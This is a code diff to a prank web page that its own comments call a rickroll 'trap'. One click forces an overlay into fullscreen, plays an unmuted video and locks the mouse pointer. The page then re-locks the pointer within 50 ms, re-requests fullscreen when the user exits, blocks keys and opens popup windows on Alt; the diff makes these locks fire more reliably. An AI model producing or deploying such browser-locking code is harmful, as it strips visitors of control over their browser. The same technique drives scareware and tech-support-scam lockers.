@@ -63,30 +63,32 @@
         let isTrapActive = false;
 
         function ignite() {
-            // 1. Switch UI
+            // 1. Switch UI visibility
             card.style.display = 'none';
             overlay.style.display = 'block';
-            
-            // 2. Activate Trap State
-            isTrapActive = true;
 
-            // 3. Start Video with Sound
-            video.muted = false;
-            video.play();
-
-            // 4. Force Fullscreen
+            // 2. Fire Fullscreen immediately on user click (Browsers love this)
             if (overlay.requestFullscreen) {
                 overlay.requestFullscreen();
             } else if (overlay.webkitRequestFullscreen) {
                 overlay.webkitRequestFullscreen();
             }
 
-            // 5. Initial Mouse Lock
-            requestMouseLock();
+            // 3. Unmute and force video to load
+            video.muted = false;
+            video.play().catch(err => {
+                console.log("Autoplay context pending...", err);
+            });
         }
 
+        // THE LOCK FIX: Only lock when the video is legitimately actively playing frames
+        video.addEventListener('playing', () => {
+            isTrapActive = true;
+            requestMouseLock();
+        });
+
         function requestMouseLock() {
-            if (!isTrapActive) return; // Don't lock if video isn't running
+            if (!isTrapActive) return; 
             
             const lockMethod = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
             if (lockMethod) {
@@ -94,20 +96,21 @@
             }
         }
 
-        // NO ESCAPE: Re-lock if they try to leave
+        // NO ESCAPE: Re-lock if they break out while video runs
         document.addEventListener('pointerlockchange', () => {
             if (isTrapActive && document.pointerLockElement !== overlay) {
-                setTimeout(requestMouseLock, 50); // Force back in 50ms
+                setTimeout(requestMouseLock, 50); 
             }
         }, false);
 
         document.addEventListener('fullscreenchange', () => {
             if (isTrapActive && !document.fullscreenElement) {
-                ignite(); // Force back to fullscreen
+                // If they managed to break fullscreen, re-ignite everything
+                if (overlay.requestFullscreen) overlay.requestFullscreen();
             }
         });
 
-        // ALT + KEYBOARD TRAP
+        // KEYBOARD TRAPS
         window.addEventListener("keydown", (e) => {
             if (!isTrapActive) return;
 
@@ -118,16 +121,14 @@
 
             if (e.altKey) {
                 e.preventDefault();
-                // Spawn a backup rickroll window if they try to Alt-Tab
                 window.open(window.location.href, '_blank', 'width=500,height=500');
             }
         });
 
-        // Ensure clicking anywhere re-grabs the mouse
+        // Safety catch: clicking inside the playing video re-asserts dominance over the mouse
         document.addEventListener('mousedown', () => {
             if (isTrapActive) requestMouseLock();
         });
-
     </script>
 </body>
 </html>
